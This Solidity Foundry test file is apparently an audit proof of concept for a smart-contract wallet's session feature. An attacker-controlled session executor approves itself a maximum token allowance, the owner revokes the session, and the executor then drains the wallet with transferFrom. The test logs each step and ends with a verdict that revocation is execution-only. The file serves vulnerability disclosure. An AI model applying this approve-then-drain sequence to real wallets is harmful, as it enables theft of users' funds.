// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {WalletCore} from "../src/WalletCore.sol";
import {Storage} from "../src/Storage.sol";
import {ECDSAValidator} from "../src/validator/ECDSAValidator.sol";
import {MockERC20} from "../src/test/MockERC20.sol";
import {Call, Session} from "../src/Types.sol";
import {IWalletCore} from "../src/interfaces/IWalletCore.sol";
import {IStorage} from "../src/interfaces/IStorage.sol";
import {DeployInitHelper, DeployFactory} from "../scripts/DeployInitHelper.sol";
import {Errors} from "../src/lib/Errors.sol";

/**
 * @title SessionApproveMax_PostExpiryDrain_Revocation
 * @notice STEP 1: Revocation validation - proves revocation is execution-only
 */
contract SessionApproveMax_PostExpiryDrain_Revocation is Test {
    WalletCore wallet;
    Storage storageImpl;
    ECDSAValidator ecdsaValidator;
    MockERC20 token;
    DeployFactory deployFactory;

    address owner;
    uint256 ownerPk;
    address attacker;
    uint256 attackerPk;

    string constant NAME = "OKX Wallet";
    string constant VERSION = "1";
    uint256 constant INITIAL_BALANCE = 1000 ether;

    function setUp() public {
        ownerPk = 0xA11CE;
        owner = vm.addr(ownerPk);
        attackerPk = 0xBEEF;
        attacker = vm.addr(attackerPk);

        deployFactory = new DeployFactory();
        bytes32 salt = bytes32(0);
        (address storageAddr, address ecdsaAddr, address walletAddr) =
            DeployInitHelper.deployContracts(deployFactory, salt, NAME, VERSION);

        storageImpl = Storage(storageAddr);
        ecdsaValidator = ECDSAValidator(ecdsaAddr);
        wallet = WalletCore(payable(walletAddr));

        vm.prank(owner);
        wallet.initialize();

        vm.prank(owner);
        token = new MockERC20();

        vm.prank(owner);
        token.transfer(address(wallet), INITIAL_BALANCE);

        assertEq(token.balanceOf(address(wallet)), INITIAL_BALANCE);

        vm.prank(address(wallet));
        wallet.addValidator(address(ecdsaValidator), abi.encode(owner));
    }

    /**
     * @notice STEP 1: Revocation validation test
     * @dev Proves that revocation only blocks execution, not financial state
     */
    function test_Revocation_DoesNotRestoreFinancialSafety() public {
        emit log_string("=== STEP 1: REVOCATION VALIDATION TEST ===");
        emit log_string("");

        // Compute validator address
        address validatorAddr = wallet.computeValidatorAddress(
            address(ecdsaValidator),
            abi.encode(owner)
        );

        // Create session
        Session memory session;
        session.id = 1;
        session.executor = attacker;
        session.validator = validatorAddr;
        session.validAfter = block.timestamp;
        session.validUntil = block.timestamp + 1 hours;
        session.preHook = "";
        session.postHook = "";

        bytes32 digest = wallet.getSessionTypedHash(session);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);
        session.signature = abi.encodePacked(r, s, v);

        emit log_string("1. Execute approve(MAX) during valid session");

        Call[] memory approveCalls = new Call[](1);
        approveCalls[0] = Call({
            target: address(token),
            value: 0,
            data: abi.encodeWithSignature(
                "approve(address,uint256)",
                attacker,
                type(uint256).max
            )
        });

        vm.prank(attacker);
        wallet.executeFromExecutor(approveCalls, session);

        uint256 allowanceAfterApprove = token.allowance(address(wallet), attacker);
        emit log_named_uint("   Allowance after approve", allowanceAfterApprove);
        assertEq(allowanceAfterApprove, type(uint256).max, "Allowance should be MAX");
        emit log_string("   [PASS] approve(MAX) executed successfully");
        emit log_string("");

        // Step 2: Owner revokes session
        emit log_string("2. Owner calls revokeSession(session.id)");

        // Get storage and revoke
        IStorage walletStorage = IStorage(wallet.getMainStorage());
        vm.prank(address(wallet));
        walletStorage.revokeSession(session.id);

        emit log_string("   [PASS] Session revoked by owner");
        emit log_string("");

        // Step 3: Confirm executeFromExecutor reverts after revoke
        emit log_string("3. Confirm: executeFromExecutor reverts after revoke");

        Call[] memory testCalls = new Call[](1);
        testCalls[0] = Call({
            target: address(token),
            value: 0,
            data: abi.encodeWithSignature("transfer(address,uint256)", attacker, 1 ether)
        });

        vm.prank(attacker);
        vm.expectRevert(Errors.InvalidSessionId.selector);
        wallet.executeFromExecutor(testCalls, session);

        emit log_string("   [PASS] executeFromExecutor reverts with InvalidSessionId");
        emit log_string("");

        // Step 4: Confirm ERC20 allowance remains MAX
        emit log_string("4. Confirm: ERC20 allowance remains MAX after revoke");

        uint256 allowanceAfterRevoke = token.allowance(address(wallet), attacker);
        emit log_named_uint("   Allowance after revoke", allowanceAfterRevoke);
        assertEq(allowanceAfterRevoke, type(uint256).max, "Allowance must remain MAX after revoke");

        emit log_string("   [PASS] Allowance persists at MAX (NOT cleared by revocation)");
        emit log_string("");

        // Step 5: Confirm transferFrom still succeeds
        emit log_string("5. Confirm: transferFrom still succeeds after revoke");

        uint256 walletBalanceBefore = token.balanceOf(address(wallet));
        uint256 attackerBalanceBefore = token.balanceOf(attacker);

        vm.prank(attacker);
        token.transferFrom(address(wallet), attacker, walletBalanceBefore);

        uint256 walletBalanceAfter = token.balanceOf(address(wallet));
        uint256 attackerBalanceAfter = token.balanceOf(attacker);

        emit log_named_uint("   Wallet balance after transferFrom", walletBalanceAfter);
        emit log_named_uint("   Attacker balance after transferFrom", attackerBalanceAfter);

        assertEq(walletBalanceAfter, 0, "Wallet should be drained");
        assertEq(attackerBalanceAfter, INITIAL_BALANCE, "Attacker should have all funds");

        emit log_string("   [PASS] Full drain successful AFTER session revocation");
        emit log_string("");

        // Final summary
        emit log_string("============================================================");
        emit log_string("CRITICAL PROOF: Revocation is EXECUTION-ONLY");
        emit log_string("============================================================");
        emit log_string("");
        emit log_string("Revocation blocks:");
        emit log_string("  - Future executeFromExecutor calls");
        emit log_string("");
        emit log_string("Revocation does NOT:");
        emit log_string("  - Clear ERC20 allowances");
        emit log_string("  - Restore pre-session financial state");
        emit log_string("  - Prevent token drainage via transferFrom");
        emit log_string("");
        emit log_string("VERDICT: Revocation provides FALSE SENSE OF SECURITY");
        emit log_string("Wallet remains COMPROMISED after revocation");
        emit log_string("============================================================");
    }
}
